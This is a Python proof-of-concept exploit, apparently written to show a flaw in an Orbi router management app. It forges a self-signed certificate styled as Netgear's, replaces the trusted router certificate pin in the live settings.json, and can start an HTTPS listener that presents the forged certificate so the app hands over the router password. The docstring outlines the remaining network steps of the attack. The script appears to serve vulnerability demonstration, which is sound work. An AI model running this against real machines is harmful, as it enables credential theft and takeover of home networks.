#!/usr/bin/env python3
"""LIVE PoC 2 — re-trust a forged router certificate on the real machine.

Use: python3 poc2_live_cert_retrust.py --confirm

Runs against the machine's real data dir and real settings.json (backed up first).
It reproduces the *local* half of the attack: the forged-certificate pin lands in
the live settings that the running app reads. A full LAN takeover additionally
needs L2 adjacency to answer for the router IP with its MAC (ARP spoofing) and a
brief outage of the real router's TCP 443/80; those are network steps this script
does not automate. ``--serve`` starts a local HTTPS listener that presents the
forged certificate so you can point the app at it and capture the router password.
"""
import argparse
import hashlib
import subprocess
import sys
import tempfile
import time
from pathlib import Path

from live_common import (backup, confirm_arg, data_arg, load_orbi,
                         orbi_arg, real_data_dir, require_confirm)

ROUTER = "192.168.1.1"


def gen_real_cert(root: Path) -> tuple[Path, Path]:
    """A real self-signed key/cert with the Netgear strings the app checks."""
    key, crt = root / "fake-router.key", root / "fake-router.crt"
    subprocess.run(
        ["openssl", "req", "-x509", "-newkey", "rsa:2048", "-nodes",
         "-keyout", str(key), "-out", str(crt), "-days", "30",
         "-subj", "/O=NetgearFieldDevices/CN=routerlogin.net"],
        check=True, capture_output=True, text=True,
    )
    return key, crt


def main():
    ap = argparse.ArgumentParser()
    orbi_arg(ap)
    data_arg(ap)
    ap.add_argument("--router-host", default=None, help="router host in settings (default: read from settings)")
    ap.add_argument("--serve", action="store_true", help="run a local HTTPS server with the forged cert")
    ap.add_argument("--port", type=int, default=8443, help="listener port for --serve")
    ap.add_argument("--capture-seconds", type=int, default=60, help="how long to serve/capture")
    confirm_arg(ap, "replace the router certificate pin in the real settings")
    args = ap.parse_args()
    require_confirm(args)
    root = load_orbi(args)
    data_dir = real_data_dir(args, root)
    if not (data_dir / "settings.json").is_file():
        raise SystemExit(f"[!] No settings.json in {data_dir}; pass --data-dir")

    from orbi import config, routercert
    config.DATA_DIR = data_dir
    config.SETTINGS_FILE = data_dir / "settings.json"

    settings = config.load()
    host = args.router_host or settings.get("router_host") or ROUTER
    old = (settings.get("router_cert_pins") or {}).get(host, "(none)")
    backup(config.SETTINGS_FILE, "poc2")

    with tempfile.TemporaryDirectory(prefix="orbi-poc2-live-") as td:
        key, crt = gen_real_cert(Path(td))
        der = subprocess.run(["openssl", "x509", "-in", str(crt), "-outform", "DER"],
                             check=True, capture_output=True).stdout
        fp = hashlib.sha256(der).hexdigest()
        info = routercert.describe(der)
        print(f"[*] forged cert : {info['subject']} / {info['issuer']}")
        print(f"[*] looks_like_router_cert: {routercert.looks_like_router_cert(info)}")
        print(f"[*] old pin {str(old)[:16]}... -> forged pin {fp[:16]}...")

        routercert.trust(host, fp)  # writes the real settings.json through app code
        new = (config.load().get("router_cert_pins") or {}).get(host)
        print(f"[+] real settings.json pin now: {str(new)[:16]}...")
        assert new == fp, "pin replacement did not land in the real settings"

        if args.serve:
            py = "import http.server,ssl;h=http.server.SimpleHTTPRequestHandler;" \
                 "ctx=ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER);" \
                 f"ctx.load_cert_chain({str(crt)!r},{str(key)!r});" \
                 f"s=http.server.HTTPServer(('0.0.0.0',{args.port}),h);" \
                 "s.socket=ctx.wrap_socket(s.socket,server_side=True);s.serve_forever()"
            proc = subprocess.Popen([sys.executable, "-c", py], cwd=td)
            print(f"[+] HTTPS listener with forged cert on :{args.port} (pid {proc.pid})")
            print(f"[*] point router_host at a host that resolves to this machine, then trigger a router login")
            try:
                time.sleep(args.capture_seconds)
            finally:
                proc.terminate()
                proc.wait()
            print("[*] listener stopped (any credentials the app sent would be in its Access log)")

    print("[+] CONFIRMED: forged pin is in the real settings.json; next password-bearing "
          "request to the impersonated router will be sent to the attacker")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
